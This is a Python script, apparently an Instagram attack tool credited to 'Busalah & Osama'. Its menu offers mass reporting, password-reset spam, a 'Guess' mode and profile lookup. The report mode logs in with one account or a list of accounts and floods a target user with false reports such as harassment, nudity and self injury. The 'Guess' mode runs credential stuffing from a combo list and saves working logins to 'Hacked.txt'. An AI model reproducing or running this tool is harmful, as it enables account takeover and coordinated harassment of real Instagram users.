import os 

lib = input("""
[1] Download lib & update
[2] pass

[+] Please Choose >> """)

if lib == "1":
    os.system('pip install requests')
    os.system('pip install colorama')
    os.system('pip install user_agent')
    os.system('cls' if os.name == 'nt' else 'clear')
    pass
else:
    os.system('cls' if os.name == 'nt' else 'clear')
    pass


import requests
import random
import json
import threading
import secrets,uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent

#All V
os.system('color')
r   = requests.Session()
G   = Fore.GREEN
R   = Fore.RED
Y   = Fore.YELLOW
a   = 0
b   = 0
c   = 0
d   = 0
e   = 0
f   = 0
g   = 0
h   = 0
z   = 0

hacked = 0
secure = 0
factor = 0
blocked= 0
bad    = 0
error  = 0

uid = uuid.uuid4()
x = requests.get('https://tinyurl.com/y6zohma3').text.splitlines()
cookie  = secrets.token_hex(8)*2
time_now= int(datetime.now().timestamp())
while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    note = (G+"""
     [ Made By Busalah & ᴏѕᴀᴍᴀ. ]
     [ + ] @nqvc @o0dev
     [ ! ] You are not entitled to sell the Tool [ ! ]
""")
    print(note)
    print('==========================================')
    try:
        print(str(x[0]))
    except:
        pass
    tools = input(Y+"""
[1] IG Report        [2] IG Rest
[3] IG Guess         [4] IG Info
[5] Combo Maker      [6] IG Swap

[+] Enter One option » """)
    print(Style.RESET_ALL)
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        pass
    #Instagram Report
    if tools == '1':
        banner = (G+"""
[!] Coded By : Busalah & ᴏѕᴀᴍᴀ.

  ___ ___   ___                   _   
 |_ _/ __| | _ \___ _ __  ___ _ _| |_ 
  | | (_ | |   / -_) '_ \/ _ \ '_|  _|
 |___\___| |_|_\___| .__/\___/_|  \__|
                   |_|                
                        
"""+Style.RESET_ALL)
        print(banner)
        print(G+"="*37+Style.RESET_ALL)

        def close():
            input('[+] Enter To Close » ')
            quit()

        def secure():
            req = requests.session()
            MyPATH = loginJS['challenge']['api_path']
            url_api = 'https://i.instagram.com/api/v1' + MyPATH
            Secure = req.get(url_api, headers=headers, cookies=Cookies).json()
            mode = []
            if ('email') in Secure['step_data']:
                mode.append('[1]. Email')
            elif ('phone_number') in Secure['step_data']:
                mode.append('[0]. Phone')
            else:
                print('[!] Error, Try Again')
                close()
            for modes in mode:
                print(modes)
            myMode = input("[+] Enter your Mode : ")
            SecureData = {
                'choice': myMode,
                '_uuid': uid,
                '_uid': uid,
                '_csrftoken': 'missing'
            }

            Send_Mode = req.post(url_api, headers=headers, data=SecureData, cookies=Cookies).json()
            Contact = Send_Mode['step_data']['contact_point']
            print(f'[-] Done Sending The Code To » {Contact}')
            myCode = input('[+] Enter Your Code : ')
            CodeData = {
                'security_code': myCode,
                '_uuid': uid,
                '_uid': uid,
                '_csrftoken': 'missing'
            }
            Send_Code = req.post(url_api, headers=headers, data=CodeData, cookies=Cookies).text
            if 'logged_in_user' in Send_Code:
                print('[!] Login Done')
                pass
            else:
                print('[!] Error Code')
                close()
        option = input(G+"""
[1] Use one Insta Account
[2] Use Unlimited Account

[+] Enter one option : """)
        print(G+"="*37+Style.RESET_ALL)

        if option == '1':
            username = input(Y+'[+] Enter Insta UserName : ')
            password = input(Y+'[+] Enter Insta Password : ')
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US",
                "X-IG-Capabilities": "3brTvw==",
                "X-IG-Connection-Type": "WIFI",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                'Host': 'i.instagram.com',
                'Connection': 'keep-alive'
            }
            data = {
                'uuid': uid,
                'password': password,
                'username': username,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'
            }

            r1 = r.post(url, headers=headers, data=data)
            Cookies = r1.cookies
            cookie_jar = Cookies.get_dict()
            loginJS = r1.json()
            try:
                csrf_token = cookie_jar['csrftoken']
            except:
                csrf_token = cookie
            try:
                if 'logged_in_user' in r1.text:
                    r.headers.update({'X-CSRFToken': csrf_token})
                    print('[!] Login Done')
                    pass
                else:
                    if 'challenge_required' in r1.text:
                        print('[!] Account Is Secure')
                        secure()
                    else:
                        if 'two_factor_required' in r1.text:
                            print('[!] Two Factor required')
                            sleep(3)
                            close()
                        else:
                            print('[!] Error Information')
                            print(r1.text)
                            sleep(3)
                            close()
            except Exception as q:
                print(f'[!] Error : {q}')
                print('[!] Make sure you are connected to the internet and try again')
                sleep(3)
                close()
            #########################################################
            TA = input(Y+'[+] Enter User Target : ')
            SL = int(input('[+] Enter Sleep : '))
            R1 = int(input('[+] Enter Count of spam : '))
            R2 = int(input('[+] Enter Count of Harassment : '))
            R3 = int(input('[+] Enter Count of Sale drugs : '))
            R4 = int(input('[+] Enter Count of Violence : '))
            R5 = int(input('[+] Enter Count of Nudity : '))
            R6 = int(input('[+] Enter Count of Hate : '))
            R7 = int(input('[+] Enter Count of Self injury : '))
            R8 = int(input('[+] Enter Count of Me : '))
            print(Style.RESET_ALL)
            #########################################################
            url_id = 'https://www.instagram.com/{}/?__a=1'.format(TA)
            req = r.get(url_id).json()
            idd = str(req['logging_page_id'])
            TA_ID = idd.split('_')[1]
            for i in range(R1):
                url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                data1 = {'source_name':'','reason_id':'1','frx_context':''}
                report = r.post(url1,data=data1)
                if report.status_code == 200:
                    a +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                else:
                    z +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                sleep(SL)
            for i in range(R2):
                url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                data1 = {'source_name':'','reason_id':'7','frx_context':''}
                report = r.post(url1,data=data1)
                if report.status_code == 200:
                    b +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                else:
                    z +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                sleep(SL)
            for i in range(R3):
                url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                data1 = {'source_name':'','reason_id':'3','frx_context':''}
                report = r.post(url1,data=data1)
                if report.status_code == 200:
                    c +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                else:
                    z +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                sleep(SL)
            for i in range(R4):
                url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                data1 = {'source_name':'','reason_id':'5','frx_context':''}
                report = r.post(url1,data=data1)
                if report.status_code == 200:
                    d +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                else:
                    z +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                sleep(SL)
            for i in range(R5):
                url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                data1 = {'source_name':'','reason_id':'4','frx_context':''}
                report = r.post(url1,data=data1)
                if report.status_code == 200:
                    e +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                else:
                    z +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                sleep(SL)
            for i in range(R6):
                url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                data1 = {'source_name':'','reason_id':'6','frx_context':''}
                report = r.post(url1,data=data1)
                if report.status_code == 200:
                    f +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                else:
                    z +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                sleep(SL)
            for i in range(R7):
                url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                data1 = {'source_name':'','reason_id':'2','frx_context':''}
                report = r.post(url1,data=data1)
                if report.status_code == 200:
                    g +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                else:
                    z +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                sleep(SL)
            for i in range(R8):
                url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                data1 = {'source_name':'','reason_id':'8','frx_context':''}
                report = r.post(url1,data=data1)
                if report.status_code == 200:
                    h +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                else:
                    z +=1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                sleep(SL)
        elif option == '2':
            #########################################################
            TA = input(Y+'[+] Enter User Target : ')
            R1 = int(input('[+] Enter Count of spam : '))
            R2 = int(input('[+] Enter Count of Harassment : '))
            R3 = int(input('[+] Enter Count of Sale drugs : '))
            R4 = int(input('[+] Enter Count of Violence : '))
            R5 = int(input('[+] Enter Count of Nudity : '))
            R6 = int(input('[+] Enter Count of Hate : '))
            R7 = int(input('[+] Enter Count of Self injury : '))
            R8 = int(input('[+] Enter Count of Me : '))
            print(Style.RESET_ALL)
            #########################################################
            for x in open('Accounts.txt','r').read().splitlines():
                username = x.split(":")[0]
                password = x.split(":")[1]
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {
                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US",
                    "X-IG-Capabilities": "3brTvw==",
                    "X-IG-Connection-Type": "WIFI",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    'Host': 'i.instagram.com',
                    'Connection': 'keep-alive'
                }
                data = {
                    'uuid': uid,
                    'password': password,
                    'username': username,
                    'device_id': uid,
                    'from_reg': 'false',
                    '_csrftoken': 'missing',
                    'login_attempt_countn': '0'
                }

                r1 = r.post(url, headers=headers, data=data)
                Cookies = r1.cookies
                cookie_jar = Cookies.get_dict()
                loginJS = r1.json()
                try:
                    csrf_token = cookie_jar['csrftoken']
                except:
                    csrf_token = cookie
                try:
                    if 'logged_in_user' in r1.text:
                        r.headers.update({'X-CSRFToken': csrf_token})
                        print('[!] Login Done')
                        pass
                    else:
                        if 'challenge_required' in r1.text:
                            print('[!] Account Is Secure')
                            secure()
                        else:
                            if 'two_factor_required' in r1.text:
                                print('[!] Two Factor required')
                                sleep(3)
                                close()
                            else:
                                print('[!] Error Information')
                                sleep(3)
                                close()
                except Exception as q:
                    print(f'[!] Error : {q}')
                    print('[!] Make sure you are connected to the internet and try again')
                    sleep(3)
                    close()
                url_id = 'https://www.instagram.com/{}/?__a=1'.format(TA)
                req = r.get(url_id).json()
                idd = str(req['logging_page_id'])
                TA_ID = idd.split('_')[1]
                for i in range(R1):
                    url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                    data1 = {'source_name':'','reason_id':'1','frx_context':''}
                    report = r.post(url1,data=data1)
                    if report.status_code == 200:
                        a +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    else:
                        z +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    sleep(0.5)
                for i in range(R2):
                    url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                    data1 = {'source_name':'','reason_id':'7','frx_context':''}
                    report = r.post(url1,data=data1)
                    if report.status_code == 200:
                        b +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    else:
                        z +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    sleep(0.5)
                for i in range(R3):
                    url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                    data1 = {'source_name':'','reason_id':'3','frx_context':''}
                    report = r.post(url1,data=data1)
                    if report.status_code == 200:
                        c +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    else:
                        z +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    sleep(0.5)
                for i in range(R4):
                    url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                    data1 = {'source_name':'','reason_id':'5','frx_context':''}
                    report = r.post(url1,data=data1)
                    if report.status_code == 200:
                        d +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    else:
                        z +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    sleep(0.5)
                for i in range(R5):
                    url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                    data1 = {'source_name':'','reason_id':'4','frx_context':''}
                    report = r.post(url1,data=data1)
                    if report.status_code == 200:
                        e +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    else:
                        z +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    sleep(0.5)
                for i in range(R6):
                    url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                    data1 = {'source_name':'','reason_id':'6','frx_context':''}
                    report = r.post(url1,data=data1)
                    if report.status_code == 200:
                        f +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    else:
                        z +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    sleep(0.5)
                for i in range(R7):
                    url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                    data1 = {'source_name':'','reason_id':'2','frx_context':''}
                    report = r.post(url1,data=data1)
                    if report.status_code == 200:
                        g +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    else:
                        z +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    sleep(0.5)
                for i in range(R8):
                    url1 = 'https://www.instagram.com/users/{}/report/'.format(TA_ID)
                    data1 = {'source_name':'','reason_id':'8','frx_context':''}
                    report = r.post(url1,data=data1)
                    if report.status_code == 200:
                        h +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    else:
                        z +=1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(f'{banner}\n==============[Free By Busalah & ᴏѕᴀᴍᴀ. ]===============\n[-] Spam : {a}\n[-] Harassment : {b}\n[-] Sale Drugs : {c}\n[-] Violence : {d}\n[-] Nudity : {e}\n[-] Hate : {f}\n[-] Self injury : {g}\n[-] Me : {h}\n[-] Error : {z}')
                    sleep(0.5)
                url_out = 'https://www.instagram.com/accounts/logout/ajax/'
                data_out = {
                    'one_tap_app_login': '0'
                }
                hed_out = {
                    "user-agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                    'x-csrftoken': csrf_token,
                    'mid': cookie
                }
                sleep(2)
                logout = r.post(url_out, headers=hed_out, data=data_out)
                if logout.status_code == 200:
                    pass
                else:
                    print(R+f'[!] Error In logout from [{username}:{passwors}]'+Style.RESET_ALL)
                
#Instagram Rest Password
    if tools =='2':
        banner = (G+"""

  ___ ___   ___        _   
 |_ _/ __| | _ \___ __| |_ 
  | | (_ | |   / -_|_-<  _|
 |___\___| |_|_\___/__/\__|

        """)
        print(banner)
        print('==========================')
        email = input(Y+'[+] Enter Email or User : ')
        url1  = 'https://i.instagram.com/accounts/account_recovery_send_ajax/'
        head1 = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '88',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': cookie,
            'origin': 'https://i.instagram.com',
            'referer': 'https://i.instagram.com/accounts/password/reset/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'x-csrftoken': 'missing',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '5282d9579ee4',
            'x-requested-with': 'XMLHttpRequest'
        }
        data = {
            'email_or_username': email,
            'recaptcha_challenge_field': '', 
            'flow': '',
            'app_id': '',
            'source_account_id': ''
        }
        rest = r.post(url1,headers=head1,data=data).text
        if '"status": "ok"' in rest:
            print(G+f'[-] Done Send Rest to > {email}')
            sleep(4)
            print(Style.RESET_ALL)
        else:
            print(R+f'[!] Error in Send Rest..')
            sleep(4)
            print(Style.RESET_ALL)
    if tools == '3':
        r = requests.Session()
        banner = (G+"""

  ___ ___    ___                
 |_ _/ __|  / __|_  _ ___ ______
  | | (_ | | (_ | || / -_|_-<_-<
 |___\___|  \___|\_,_\___/__/__/
                                
        """)
        print(banner)
        print('==========================')
        try:
            print(str(x[0]))
        except:
            pass
        print(Style.RESET_ALL)
        for account in open('Combo.txt','r').read().splitlines():
            username = account.split(':')[0]
            password = account.split(':')[1]
            try:
                cookies = token_hex(8)*2
                url = 'https://www.instagram.com/accounts/login/ajax/'
                headers = {"user-agent": generate_user_agent(), 'x-csrftoken': 'missing',
                           'mid': token_hex(8) * 2}
                data = {'username':username,
                        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
                        'queryParams': '{}',
                        'optIntoOneTap': 'false',}
                req_login = r.post(url,headers=headers,data=data, proxies=None)
                sleep(0.5)
                if ("userId") in req_login.text:
                    with open('Hacked.txt','a') as HACKED:
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
                    hacked += 1
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
                else:
                    if ('checkpoint_required') in req_login.text:
                        with open('Secure.txt', 'a') as SECURE:
                            SECURE.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
                        secure += 1
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
                    else:
                        if ('two_factor_required') in req_login.text:
                            with open('two_factor.txt', 'a') as FACTOR:
                                FACTOR.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
                            factor += 1
                            os.system('cls' if os.name == 'nt' else 'clear')
                            print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
                        else:
                            if ('Please wait a few minutes before you try again.') in req_login.text:
                                blocked += 1
                                sleep(8)
                                os.system('cls' if os.name == 'nt' else 'clear')
                                print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
                            else:
                                bad += 1
                                os.system('cls' if os.name == 'nt' else 'clear')
                                print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
            except Exception as cc:
                print(cc)
                error += 1
                sleep(10)
                os.system('cls' if os.name == 'nt' else 'clear')
                print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
    if tools == '4':
        banner = (G+'''
        
  ___ ____   ___        __       
 |_ _/ ___| |_ _|_ __  / _| ___  
  | | |  _   | || '_ \| |_ / _ \ 
  | | |_| |  | || | | |  _| (_) |
 |___\____| |___|_| |_|_|  \___/ 
                                 

        ''')
        print(banner)
        print('==========================')
        head = {
            'HOST': "www.instagram.com",
            'KeepAlive' : 'True',
            'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
            'Cookie': cookie,
            'Accept' : "*/*",
            'ContentType' : "application/x-www-form-urlencoded",
            "X-Requested-With" : "XMLHttpRequest",
            "X-IG-App-ID": "936619743392459",
            "X-Instagram-AJAX" : "missing",
            "X-CSRFToken" : "missing",
            "Accept-Language" : "en-US,en;q=0.9"
        }
        target = input(Y+'[+] Enter User : ')
        url_id = f'https://www.instagram.com/{target}/?__a=1'
        req_id = r.get(url_id,headers=head).json()
        bio    = str(req_id['graphql']['user']['biography'])
